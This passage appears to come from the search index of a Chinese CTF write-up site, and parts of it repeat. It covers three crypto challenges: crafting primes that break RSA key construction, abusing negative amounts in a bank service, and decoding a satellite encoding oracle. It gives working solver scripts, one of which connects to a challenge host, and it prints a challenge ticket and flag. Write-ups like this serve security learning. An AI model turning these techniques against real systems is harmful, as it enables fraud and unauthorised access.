.blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 \u6211\u8ba4\u771f\u68c0\u67e5\u4e86\u4e00\u4e0b\u6211\u7684 RSA \u53c2\u6570\uff0c\u4f3c\u4e4e\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u4f1a\u2026\u2026 test.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from Crypto.Util.number import * from Crypto.PublicKey import RSA from hashlib import sha256 import random , os , signal , string def proof_of_work (): random . seed ( os . urandom ( 8 )) proof = '' . join ([ random . choice ( string . ascii_letters + string . digits ) for _ in range ( 20 )]) _hexdigest = sha256 ( proof . encode ()) . hexdigest () print ( f \"sha256(XXXX+ { proof [ 4 :] } ) == { _hexdigest } \" ) print ( 'Give me XXXX: ' ) x = input () if len ( x ) != 4 or sha256 ( x . encode () + proof [ 4 :] . encode ()) . hexdigest () != _hexdigest : print ( 'Wrong PoW' ) return False return True if not proof_of_work (): exit ( 1 ) signal . alarm ( 10 ) print ( \"Give me a bad RSA keypair.\" ) try : p = int ( input ( 'p = ' )) q = int ( input ( 'q = ' )) assert p > 0 assert q > 0 assert p != q assert p . bit_length () == 512 assert q . bit_length () == 512 assert isPrime ( p ) assert isPrime ( q ) n = p * q e = 65537 assert p % e != 1 assert q % e != 1 d = inverse ( e , ( p - 1 ) * ( q - 1 )) except : print ( \"Invalid params\" ) exit ( 2 ) try : key = RSA . construct ([ n , e , d , p , q ]) print ( \"This is not a bad RSA keypair.\" ) exit ( 3 ) except KeyboardInterrupt : print ( \"Hacker detected.\" ) exit ( 4 ) except ValueError : print ( \"How could this happen?\" ) from secret import flag print ( flag ) \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u8f93\u5165\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u7684 \\(p,q\\) \uff0c\u5e76\u6700\u7ec8\u4f7f RSA.construct \u6839\u636e\u63d0\u4f9b\u7684\u53c2\u6570\u6267\u884c\u5931\u8d25 \u6392\u9664\u8c03\u7528 RSA.construct \u524d\u5df2\u8fdb\u884c\u7684\u68c0\u67e5\uff0c\u6700\u6709\u53ef\u80fd\u5bfc\u81f4\u5931\u8d25\u7684\u68c0\u67e5\u662f 1 2 if Integer ( n ) . gcd ( d ) != 1 : raise ValueError ( \"RSA private exponent is not coprime to modulus\" ) \u4ee4 \\(d = k_1p\\) \uff0c\u9700\u8981\u6c42 \\(q\\) \u6839\u636e \\(ed\\equiv 1\\ (mod\\ \\phi)\\) \uff0c\u6709 \\(ek_1\\equiv 1\\ (mod\\ p-1)\\) \uff0c\u6c42\u5f97 \\(k_1\\) \u63a5\u4e0b\u6765\u7531 \\(ek_1p=k_2(p-1)(q-1)+1\\) \u5f97 \\(q=\\frac{ek_1p-1}{k_2(p-1)}+1\\) \uff0c\u53ef\u5728 \\([1, e+1]\\) \u7684\u8303\u56f4\u5185\u7206\u7834 \\(k_2\\) Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 from Crypto.Util.number import getPrime , isPrime , inverse e = 65537 while True : p = getPrime ( 512 ) k1 = inverse ( e , p - 1 ) t = ( e * k1 * p - 1 ) // ( p - 1 ) for k2 in range ( 1 , e + 1 ): if t % k2 == 0 : q = t // k2 + 1 if isPrime ( q ) and q . bit_length () == 512 : print ( p , q ) exit ()","title":"badkey1"},{"location":"crypto/badkey1/#_1","text":"\u6211\u8ba4\u771f\u68c0\u67e5\u4e86\u4e00\u4e0b\u6211\u7684 RSA \u53c2\u6570\uff0c\u4f3c\u4e4e\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u4f1a\u2026\u2026 test.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from Crypto.Util.number import * from Crypto.PublicKey import RSA from hashlib import sha256 import random , os , signal , string def proof_of_work (): random . seed ( os . urandom ( 8 )) proof = '' . join ([ random . choice ( string . ascii_letters + string . digits ) for _ in range ( 20 )]) _hexdigest = sha256 ( proof . encode ()) . hexdigest () print ( f \"sha256(XXXX+ { proof [ 4 :] } ) == { _hexdigest } \" ) print ( 'Give me XXXX: ' ) x = input () if len ( x ) != 4 or sha256 ( x . encode () + proof [ 4 :] . encode ()) . hexdigest () != _hexdigest : print ( 'Wrong PoW' ) return False return True if not proof_of_work (): exit ( 1 ) signal . alarm ( 10 ) print ( \"Give me a bad RSA keypair.\" ) try : p = int ( input ( 'p = ' )) q = int ( input ( 'q = ' )) assert p > 0 assert q > 0 assert p != q assert p . bit_length () == 512 assert q . bit_length () == 512 assert isPrime ( p ) assert isPrime ( q ) n = p * q e = 65537 assert p % e != 1 assert q % e != 1 d = inverse ( e , ( p - 1 ) * ( q - 1 )) except : print ( \"Invalid params\" ) exit ( 2 ) try : key = RSA . construct ([ n , e , d , p , q ]) print ( \"This is not a bad RSA keypair.\" ) exit ( 3 ) except KeyboardInterrupt : print ( \"Hacker detected.\" ) exit ( 4 ) except ValueError : print ( \"How could this happen?\" ) from secret import flag print ( flag )","title":"\u9898\u76ee"},{"location":"crypto/badkey1/#_2","text":"\u9700\u8981\u8f93\u5165\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u7684 \\(p,q\\) \uff0c\u5e76\u6700\u7ec8\u4f7f RSA.construct \u6839\u636e\u63d0\u4f9b\u7684\u53c2\u6570\u6267\u884c\u5931\u8d25 \u6392\u9664\u8c03\u7528 RSA.construct \u524d\u5df2\u8fdb\u884c\u7684\u68c0\u67e5\uff0c\u6700\u6709\u53ef\u80fd\u5bfc\u81f4\u5931\u8d25\u7684\u68c0\u67e5\u662f 1 2 if Integer ( n ) . gcd ( d ) != 1 : raise ValueError ( \"RSA private exponent is not coprime to modulus\" ) \u4ee4 \\(d = k_1p\\) \uff0c\u9700\u8981\u6c42 \\(q\\) \u6839\u636e \\(ed\\equiv 1\\ (mod\\ \\phi)\\) \uff0c\u6709 \\(ek_1\\equiv 1\\ (mod\\ p-1)\\) \uff0c\u6c42\u5f97 \\(k_1\\) \u63a5\u4e0b\u6765\u7531 \\(ek_1p=k_2(p-1)(q-1)+1\\) \u5f97 \\(q=\\frac{ek_1p-1}{k_2(p-1)}+1\\) \uff0c\u53ef\u5728 \\([1, e+1]\\) \u7684\u8303\u56f4\u5185\u7206\u7834 \\(k_2\\)","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/badkey1/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 from Crypto.Util.number import getPrime , isPrime , inverse e = 65537 while True : p = getPrime ( 512 ) k1 = inverse ( e , p - 1 ) t = ( e * k1 * p - 1 ) // ( p - 1 ) for k2 in range ( 1 , e + 1 ): if t % k2 == 0 : q = t // k2 + 1 if isPrime ( q ) and q . bit_length () == 512 : print ( p , q ) exit ()","title":"Exploit"},{"location":"crypto/bank/","text":"\u89e3\u9898\u601d\u8def \u00b6 nc \u8fde\u8fc7\u53bb\uff0c\u8981\u6c42\u8f93\u5165\u4e09\u4e2a\u5b57\u7b26\uff0c \u5176\u4e0e\u5269\u4e0b\u7684\u968f\u673a\u5b57\u7b26\u4e32\u8fdb\u884c SHA256 \u52a0\u5bc6\u7684\u7ed3\u679c\u7b49\u4e8e\u7b49\u53f7\u540e\u7684\u968f\u673a\u5b57\u7b26\u4e32 1 2 3 $ nc 39 .101.134.52 8005 sha256 ( XXX+f2DXa00fbrrtXrZAV ) == fad0b6f4dc03f907b999f15db8b467b17139189d2cc61f9fc37e213d91d0a2aa Give me XXX: \u4f7f\u7528 Python \u7834\u89e3 1 2 3 4 5 6 7 8 9 10 from hashlib import sha256 import itertools table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' for ch in itertools . permutations ( table , 3 ): m = '' . join ( ch ) + 'f2DXa00fbrrtXrZAV' h = sha256 ( m . encode ()) . hexdigest () if ( h == 'fad0b6f4dc03f907b999f15db8b467b17139189d2cc61f9fc37e213d91d0a2aa' ): print ( m [ 0 : 3 ]) \u8fdb\u5165\u7cfb\u7edf\u540e\uff0c\u8981\u6c42\u8f93\u5165\u540d\u5b57\uff0c\u968f\u4fbf\u8f93\u4e00\u4e2a\u5c31\u53ef\u4ee5 1 2 3 4 5 6 7 Welcome to the challenge! give me your name:yanhui your cash:10 you can choose: transact, view records, provide a record, get flag, hint \u9996\u5148\u9009\u62e9 get flag \u67e5\u770b\uff0c\u63d0\u793a\u73b0\u91d1\u4e0d\u8db3 1 2 3 > get flag you need pay 1000 for the flag! don ' t have enough money! \u67e5\u770b hint \uff0c\u7ed9\u51fa\u4e86 transact \u7684\u52a0\u5bc6\u65b9\u5f0f 1 2 3 4 5 6 7 def transact_ecb ( key, sender, receiver, amount ) : aes = AES.new ( key, AES.MODE_ECB ) ct = b \"\" ct += aes.encrypt ( sender ) ct += aes.encrypt ( receiver ) ct += aes.encrypt ( amount ) return ct view records \u7ed9\u51fa\u7684\u662f\u7ecf\u8fc7\u52a0\u5bc6\u7684\u4ea4\u6613\u8bb0\u5f55\uff0c provide a record \u5219\u7ed9\u51fa My system is secure if you can give me other records, the receiver can also get the money. \u9996\u8981\u76ee\u6807\u662f\u8981\u83b7\u5f97\u8db3\u591f\u7684\u73b0\u91d1\uff0c\u770b\u770b\u4ea4\u6613 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 > transact please give me the trader and the amount ( for example:Alice 1 ) > Alice 1 16afee8cc0a88bf0478fefe229e68418a9a0627e2da31f1d055e01d7000a3b3a1794bbe06d2ed80b02b1c90ba2c4606f your cash:9 you can choose: transact, view records, provide a record, get flag, hint > transact please give me the trader and the amount ( for example:Alice 1 ) > Alice 0 16afee8cc0a88bf0478fefe229e68418a9a0627e2da31f1d055e01d7000a3b3ab55eefd708d39ed2b4ce4d561c34e5ec your cash:9 \u8f93\u5165\u91d1\u989d\u4e3a \\(0\\) \u7684\u8bdd\uff0c\u4ea4\u6613\u4e5f\u53ef\u4ee5\u6210\u529f\u8fdb\u884c\uff01\u5c1d\u8bd5\u4e00\u4e0b\u8d1f\u6570\uff0c\u770b\u80fd\u4e0d\u80fd\u83b7\u5f97\u73b0\u91d1 1 2 3 4 5 6 7 > transact please give me the trader and the amount ( for example:Alice 1 ) > Alice -1 dd664379452c6af73b382cc5cd076754c70214708e2c0071ed74906852ecc510f2f0bd5754e02a2b03c635178e0200c5 your cash:11 \u53d1\u73b0\u53ef\u4ee5\u6210\u529f\u589e\u52a0\u6301\u6709\u73b0\u91d1\uff0c\u5e76\u6ca1\u6709\u88ab\u8fc7\u6ee4\u4e4b\u7c7b\u7684\uff0c\u83b7\u5f97\u8db3\u591f\u73b0\u91d1\u4e4b\u540e\u5c31\u53ef\u4ee5\u300e\u8d2d\u4e70\u300fFlag \u4e86\uff01\u3010\u4e4b\u524d\u8fd8\u4ee5\u4e3a\u8981\u8003\u8651 ECB \u52a0\u5bc6\u2026\u2026\u3011","title":"bank"},{"location":"crypto/bank/#_1","text":"nc \u8fde\u8fc7\u53bb\uff0c\u8981\u6c42\u8f93\u5165\u4e09\u4e2a\u5b57\u7b26\uff0c \u5176\u4e0e\u5269\u4e0b\u7684\u968f\u673a\u5b57\u7b26\u4e32\u8fdb\u884c SHA256 \u52a0\u5bc6\u7684\u7ed3\u679c\u7b49\u4e8e\u7b49\u53f7\u540e\u7684\u968f\u673a\u5b57\u7b26\u4e32 1 2 3 $ nc 39 .101.134.52 8005 sha256 ( XXX+f2DXa00fbrrtXrZAV ) == fad0b6f4dc03f907b999f15db8b467b17139189d2cc61f9fc37e213d91d0a2aa Give me XXX: \u4f7f\u7528 Python \u7834\u89e3 1 2 3 4 5 6 7 8 9 10 from hashlib import sha256 import itertools table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' for ch in itertools . permutations ( table , 3 ): m = '' . join ( ch ) + 'f2DXa00fbrrtXrZAV' h = sha256 ( m . encode ()) . hexdigest () if ( h == 'fad0b6f4dc03f907b999f15db8b467b17139189d2cc61f9fc37e213d91d0a2aa' ): print ( m [ 0 : 3 ]) \u8fdb\u5165\u7cfb\u7edf\u540e\uff0c\u8981\u6c42\u8f93\u5165\u540d\u5b57\uff0c\u968f\u4fbf\u8f93\u4e00\u4e2a\u5c31\u53ef\u4ee5 1 2 3 4 5 6 7 Welcome to the challenge! give me your name:yanhui your cash:10 you can choose: transact, view records, provide a record, get flag, hint \u9996\u5148\u9009\u62e9 get flag \u67e5\u770b\uff0c\u63d0\u793a\u73b0\u91d1\u4e0d\u8db3 1 2 3 > get flag you need pay 1000 for the flag! don ' t have enough money! \u67e5\u770b hint \uff0c\u7ed9\u51fa\u4e86 transact \u7684\u52a0\u5bc6\u65b9\u5f0f 1 2 3 4 5 6 7 def transact_ecb ( key, sender, receiver, amount ) : aes = AES.new ( key, AES.MODE_ECB ) ct = b \"\" ct += aes.encrypt ( sender ) ct += aes.encrypt ( receiver ) ct += aes.encrypt ( amount ) return ct view records \u7ed9\u51fa\u7684\u662f\u7ecf\u8fc7\u52a0\u5bc6\u7684\u4ea4\u6613\u8bb0\u5f55\uff0c provide a record \u5219\u7ed9\u51fa My system is secure if you can give me other records, the receiver can also get the money. \u9996\u8981\u76ee\u6807\u662f\u8981\u83b7\u5f97\u8db3\u591f\u7684\u73b0\u91d1\uff0c\u770b\u770b\u4ea4\u6613 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 > transact please give me the trader and the amount ( for example:Alice 1 ) > Alice 1 16afee8cc0a88bf0478fefe229e68418a9a0627e2da31f1d055e01d7000a3b3a1794bbe06d2ed80b02b1c90ba2c4606f your cash:9 you can choose: transact, view records, provide a record, get flag, hint > transact please give me the trader and the amount ( for example:Alice 1 ) > Alice 0 16afee8cc0a88bf0478fefe229e68418a9a0627e2da31f1d055e01d7000a3b3ab55eefd708d39ed2b4ce4d561c34e5ec your cash:9 \u8f93\u5165\u91d1\u989d\u4e3a \\(0\\) \u7684\u8bdd\uff0c\u4ea4\u6613\u4e5f\u53ef\u4ee5\u6210\u529f\u8fdb\u884c\uff01\u5c1d\u8bd5\u4e00\u4e0b\u8d1f\u6570\uff0c\u770b\u80fd\u4e0d\u80fd\u83b7\u5f97\u73b0\u91d1 1 2 3 4 5 6 7 > transact please give me the trader and the amount ( for example:Alice 1 ) > Alice -1 dd664379452c6af73b382cc5cd076754c70214708e2c0071ed74906852ecc510f2f0bd5754e02a2b03c635178e0200c5 your cash:11 \u53d1\u73b0\u53ef\u4ee5\u6210\u529f\u589e\u52a0\u6301\u6709\u73b0\u91d1\uff0c\u5e76\u6ca1\u6709\u88ab\u8fc7\u6ee4\u4e4b\u7c7b\u7684\uff0c\u83b7\u5f97\u8db3\u591f\u73b0\u91d1\u4e4b\u540e\u5c31\u53ef\u4ee5\u300e\u8d2d\u4e70\u300fFlag \u4e86\uff01\u3010\u4e4b\u524d\u8fd8\u4ee5\u4e3a\u8981\u8003\u8651 ECB \u52a0\u5bc6\u2026\u2026\u3011","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/black_hole/","text":"\u9898\u76ee \u00b6 We found a satellite but we can't speak its language. It changes its encryption encoding every time we open a connection... We've got an open connection to the satellite. It sent us this encoded message. Decode it and send it back to get the flag. Connecting \u00b6 1 nc black_hole.satellitesabove.me 5300 \u89e3\u9898\u601d\u8def \u00b6 \u6ca1\u6709\u7ed9\u6e90\u7801\uff0c\u76f4\u63a5\u8fde\u670d\u52a1\u5668\u5206\u6790 \u5bc6\u6587 \u7f16\u7801\u7ed3\u679c \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) \u65e2\u7136\u662f\u7f16\u7801\uff0c\u5e94\u8be5\u6709\u4e00\u5b9a\u89c4\u5f8b\u53ef\u5faa\u3002\u5c31\u5148\u8bd5\u8bd5\u6700\u5c0f\u7684\u4e24\u4e2a\u5427...\u7b49\u7b49\uff01\u5b83\u4eec\u6709\u4ec0\u4e48\u533a\u522b\u4e48\uff1f\uff01-\u03c9- \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u5dee\u4e86\u4e00\u4e2a\u5b57\u7b26 1 2 3 4 5 6 7 8 9 10 Generating black hole... Encoded msg is: e7a1977d3bce40b06475a6f44ca13535a345397224a927fc2f59633f66d7272bd45c1c8c9030755cf4e05fbd20ed995480e198b52498b0dcdfde8f027dd58c0c836f50045463ee0846df632a4c4b8bc7a7978290820441649b13760ee645d2f36af7571206d66b45b5eea1e0b13de2b84505a1b85c09d032f206f12b1179ca347eaecc6344af06e8c34bfe93072a5c0c6587a7e1c6c6bd1cd37a8868da78ecd103ce8d4f8e48d38369f669feb2ebf8ec9a74f70dbf22e84028b9290665ff2822fc4311047e68f02b24a5661cea07b42ec2dbfed36c964785cee1d70818aa2bdeece7680ef144c6e1797f695d2681a1210be06cd9e9d65487bbda4c5bba402030 We can stream 18909 bytes of data before the sat kills the connection. Please help. ( Send your message in hex. ) ( 18909 ) Msg: 00 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c07a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 # 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c0_7_a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 ( 18908 ) Msg: 01 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c06a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 # 9844ce7e63ee946ac1b2572627e46fa2309f6bc2a10dd9f0062f23d826884f20ab56eeaec99490ff8694fc8b8e5097177a0deb5345212e9eb52ac7e90edfecafedc8e1ef9b3c7c9018581ca238ea246705b9185af5d748df08563e45d0e64b642743d826bcd7257c8e126193f0bc15682027a2c7d7611d9327c0779808e2c82f3f0cea10192127ff0ce72091f9d42b576180e18a0e3b5d159df3e4c30c0_6_a59d98756abc68a009cdf125282757a1e7a9d1792cb0d8664007af41ba1fc625562ebbf2601018899aa22a1c27e30fd43e368d40d39f4e8b962c42e24c9d0ecedf0681bdab587f5c7a2950658e141175b5c1e358fdc765b6d6ff187f7fc8a3757eb9 \u968f\u540e\u8bd5\u4e86\u4e00\u4e9b 00 \uff0c\u53d1\u73b0\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e \\(2\\) \u7684\u6d88\u606f\u4e0d\u80fd\u5305\u542b 00 \uff08\u770b\u4e0a\u53bb 0100 \u662f\u4e2a\u4f8b\u5916\uff09 1 2 3 4 5 6 7 8 9 10 11 12 ( 18909 ) Msg: 0000 Must provide message with no NULL bytes ( 00 ) ( 18907 ) Msg: 0001 Must provide message with no NULL bytes ( 00 ) ( 18905 ) Msg: 0100 78c407e05c297ed2de6ebb9f4741be52a234e5519a0e4bd9be2e835dfd41ffbef0db1c87ea62db03f2711b96bb843afa3eadf6730996abbad539dba2cb433a02a877febfe8799e75e9170382c3c13238a4db876a691593e95a28267b3cedfa694f1a211fefa834a4bd41d670b3ad2f1dc8175c9716f136287c1c0c175914762d68069003215bc32fbc9dda8c01fc072eb379ecec40d2138e5f70b0b6e3af62bd1dbc1980227d5cf3475b979e5a19bf8069ad2f407f4e9edd109214bb70a2fcd343a5be3c8e408831a2482d0bf926b5322a521eb6158163419fb79a08802e052026e9bf9a20e2b7a8b5c50b1b36f0a6ea89f037a96a1f80784d2a2af4c7954aa2 ( 18903 ) Msg: 010000 Must provide message with no NULL bytes ( 00 ) ( 18900 ) Msg: 000001 Must provide message with no NULL bytes ( 00 ) ( 18897 ) Msg: 010001 Must provide message with no NULL bytes ( 00 ) \uff08\u7701\u7565\u6253\u8868\u627e\u89c4\u5f8b\u7684\u8fc7\u7a0b\uff09\u901a\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u786e\u5b9a \u76f8\u540c\u957f\u5ea6\u7684\u6d88\u606f\uff0c\u7f16\u7801\u7ed3\u679c\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e0d\u4f1a\u8d85\u8fc7\u6d88\u606f\u957f\u5ea6 \u5728\u4e00\u6b21\u901a\u4fe1\u4e2d\uff0c\u5bf9\u4e8e\u76f8\u540c\u957f\u5ea6\u7684\u6d88\u606f\uff0c\u660e\u6587\u7684\u6bcf\u4e2a\u4f4d\u7f6e\u4e0e\u7f16\u7801\u7ed3\u679c\u6709\u56fa\u5b9a\u4e14\u552f\u4e00\u7684\u6620\u5c04 \u5bf9\u4e8e\u660e\u6587\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u5206\u522b\u8003\u8651\u503c\u7684\u9ad8\u516b\u4f4d\u548c\u4f4e\u516b\u4f4d\uff0c\u5176\u7f16\u7801\u7ed3\u679c\u7531\u9ad8\u516b\u4f4d\u4e0e\u4f4e\u516b\u4f4d\u7684\u6620\u5c04\u7ed3\u679c\u7ec4\u5408\u800c\u6210\uff0c\u5982\u660e\u6587 10 \u5bf9\u5e94\u7f16\u7801\u7ed3\u679c 45 \uff0c\u660e\u6587 0a \u5bf9\u5e94\u7f16\u7801\u7ed3\u679c e3 \uff0c\u90a3\u4e48\u53ef\u63a8\u51fa\u660e\u6587 1a \u5bf9\u5e94\u7f16\u7801\u7ed3\u679c 43 \u660e\u6587\u4e0d\u540c\u4f4d\u7f6e\u4e0e\u7f16\u7801\u7ed3\u679c\u503c\u7684\u6620\u5c04\u4e0d\u540c \u56e0\u4e3a\u8fd8\u9650\u5236\u4e86\u53d1\u9001\u6d88\u606f\u5b57\u8282\u7684\u603b\u6570\uff0c\u6240\u4ee5\u4e00\u6b21\u67e5\u8be2\u5e94\u5c3d\u53ef\u80fd\u591a\u83b7\u5f97\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 from pwn import * from Crypto.Util.number import long_to_bytes def compare ( a , b ): a , b = bytes . fromhex ( a ), bytes . fromhex ( b ) diff = 0 for i , j in zip ( a , b ): if i != j : diff += 1 return diff def index_diff ( a , b ): a , b = bytes . fromhex ( a ), bytes . fromhex ( b ) pos = [] for i in range ( len ( a )): if a [ i ] != b [ i ]: pos . append ( i ) return pos ticket = 'ticket{foxtrot294921delta3:GD1KWFvlJJN0ge3qaEddP9Olmir30Q5z7V67AmZ_e1b8RtSz61E8uIlvDpuCSGS6pw}' conn = connect ( 'black_hole.satellitesabove.me' , 5300 ) conn . sendafter ( 'Ticket please:' , f ' { ticket } \\n ' ) enc = conn . recvline_contains ( 'Encoded msg is: ' ) . decode () . split ( ' ' )[ - 1 ] # \u83b7\u53d6\u7f16\u7801\u6d88\u606f\u7684\u957f\u5ea6 enc_len = 0 for i in range ( 140 , 0x100 ): # \u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u5f85\u6c42\u6d88\u606f\u7684\u957f\u5ea6\u57fa\u672c\u5728 140 \u53ca\u4ee5\u4e0a conn . sendafter ( 'Msg:' , f ' { \"01\" * i } \\n ' ) res = conn . recvline () . decode () . strip () if compare ( enc , res ) <= i : enc_len = i print ( f 'Length: { i } ' ) break # pre: \u6d88\u606f b'\\x01' * enc_len \u7684\u7f16\u7801\u7ed3\u679c\uff0c\u4fbf\u4e8e\u786e\u5b9a\u660e\u6587\u5404\u4e2a\u4f4d\u5728\u7f16\u7801\u7ed3\u679c\u7684\u4f4d\u7f6e # pos_map: \u660e\u6587\u5404\u4e2a\u4f4d\u7f6e\u4e0e\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u6620\u5c04 # first_map: \u660e\u6587\u5404\u4e2a\u4f4d\u7f6e\u9ad8\u516b\u4f4d\u7684\u7f16\u7801\u6620\u5c04\u8868 0x0_ - 0xf_ # second_map: \u660e\u6587\u5404\u4e2a\u4f4d\u7f6e\u4f4e\u516b\u4f4d\u7684\u7f16\u7801\u6620\u5c04\u8868 0x_0 - 0x_f pre , pos_map , first_map , second_map = res , [ - 1 ] * enc_len , {}, {} for i in [ 0x02 , 0x10 , 0x21 , 0x33 , 0x44 , 0x55 , 0x66 , 0x77 , 0x88 , 0x99 , 0xaa , 0xbb , 0xcc , 0xdd , 0xee , 0xff ]: s = long_to_bytes ( i ) * enc_len conn . sendafter ( 'Msg:' , f ' { s . hex () } \\n ' ) res = conn . recvline () . decode () . strip () pd = index_diff ( res , pre ) for j in pd : p = j * 2 if p in first_map : first_map [ p ][ res [ p ]] = ( i & 0xf0 ) // 0x10 else : first_map [ p ] = { res [ p ]: 0 } if p in second_map : second_map [ p ][ res [ p + 1 ]] = i & 0xf else : second_map [ p ] = { res [ p + 1 ]: 2 } # \u83b7\u5f97\u7f16\u7801\u7ed3\u679c\u5404\u4e2a\u4f4d\u7f6e\u4e0e\u660e\u6587\u503c\u7684\u6620\u5c04\u5173\u7cfb\u540e\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u660e\u6587\u6765\u786e\u5b9a\u4f4d\u7f6e\u7684\u6620\u5c04\u5173\u7cfb for i in range ( 0 , enc_len , 0x10 ): s = bytearray ( b ' \\x01 ' ) * enc_len for j in range ( min ( 0x10 , enc_len - i )): s [ i + j ] = 0x10 + j conn . sendafter ( 'Msg:' , f ' { s . hex () } \\n ' ) res = conn . recvline () . decode () . strip () pd = index_diff ( res , pre ) pos , sm = [], [] for j in pd : p = j * 2 pos . append ( p ) sm . append ( second_map [ p ][ res [ p + 1 ]]) for j , k in zip ( sm , pos ): pos_map [ i + j ] = k s = bytearray ( b ' \\x00 ' ) * enc_len for i in range ( enc_len ): s [ i ] = first_map [ pos_map [ i ]][ enc [ pos_map [ i ]]] * 0x10 + second_map [ pos_map [ i ]][ enc [ pos_map [ i ] + 1 ]] conn . sendafter ( 'Msg:' , f ' { s . hex () } \\n ' ) conn . interactive () # Satellite-link synced! Flag: flag{foxtrot294921delta3:GEPzPQGVu-6MW0Ly8t6rSDotRhMZUOVCgnp-lcMPJbIiuvNwfH2MeDjkChz6vPvg8Hn6sGWG2i_8XroCUhRsIE4} Flag \u00b6 flag{foxtrot294921delta3:GEPzPQGVu-6MW0Ly8t6rSDotRhMZUOVCgnp-lcMPJbIiuvNwfH2MeDjkChz6vPvg8Hn6sGWG2i_8XroCUhRsIE4}","title":"Black Hole"},{"location":"crypto/black_hole/#_1","text":"We found a satellite but we can't speak its language. It changes its encryption encoding every time we open a connection... We've got an open connection to the satellite. It sent us this encoded message. Decode it and send it back to get the flag.","title":"\u9898\u76ee"},{"location":"crypto/black_hole/#connecting","text":"1 nc black_hole.satellitesabove.me 5300","title":"Connecting"},{"location":"crypto/black_hole/#_2","text":"\u6ca1\u6709\u7ed9\u6e90\u7801\uff0c\u76f4\u63a5\u8fde\u670d\u52a1\u5668\u5206\u6790 \u5bc6\u6587 \u7f16\u7801\u7ed3\u679c \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) \u65e2\u7136\u662f\u7f16\u7801\uff0c\u5e94\u8be5\u6709\u4e00\u5b9a\u89c4\u5f8b\u53ef\u5faa\u3002\u5c31\u5148\u8bd5\u8bd5\u6700\u5c0f\u7684\u4e24\u4e2a\u5427...\u7b49\u7b49\uff01\u5b83\u4eec\u6709\u4ec0\u4e48\u533a\u522b\u4e48\uff1f\uff01-\u03c9- \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u5dee\u4e86\u4e00\u4e2a\u5b57\u7b26 1 2 3 4 5 6 7 8 9 10 Generating black hole... Encoded msg is: 